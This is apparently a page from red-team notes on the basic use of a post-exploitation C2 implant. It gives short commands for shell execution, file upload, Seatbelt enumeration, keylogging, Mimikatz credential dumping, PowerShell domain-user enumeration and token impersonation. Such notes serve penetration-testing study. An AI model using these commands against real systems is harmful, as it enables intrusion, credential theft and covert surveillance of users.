# Basic usage

## Basic usage

### Assembly

![](../../../../.gitbook/assets/image%20%28240%29.png)

### Commands execution

```text
ShellCmd cmd /c net user
```



### Download / Upload files

* **Upload a file**

```text
 Upload /filepath:"C:\Users\HOMER_POTTER\test.exe" 
```

![](../../../../.gitbook/assets/image%20%28208%29.png)

* **Download**

![](../../../../.gitbook/assets/image%20%28266%29.png)

\*\*\*\*

### Enumeration

```csharp
Seatbelt -group=all
```

![](../../../../.gitbook/assets/image%20%28303%29.png)

### Keylogger

#### Set time to run, ie `keylogger 20` to make it run for 20 seconds

![](../../../../.gitbook/assets/image%20%28111%29.png)

### Mimikatz

`LogonPasswords`

![](../../../../.gitbook/assets/image%20%28222%29.png)

### Powershell 

* **import remote modules**

```text
PowerShellImport
```

![](../../../../.gitbook/assets/image%20%28193%29.png)

* Execute commands from the imported module:

```text
powershell Get-domainUsers
```

![](../../../../.gitbook/assets/image%20%2864%29.png)

### Sharshell commands 

### ! case sensitive

#### Using Tokens

```text
sharpshell using (Tokens t = new Tokens()) {return t.WhoAmI(); }
```

![](../../../../.gitbook/assets/image%20%28250%29.png)



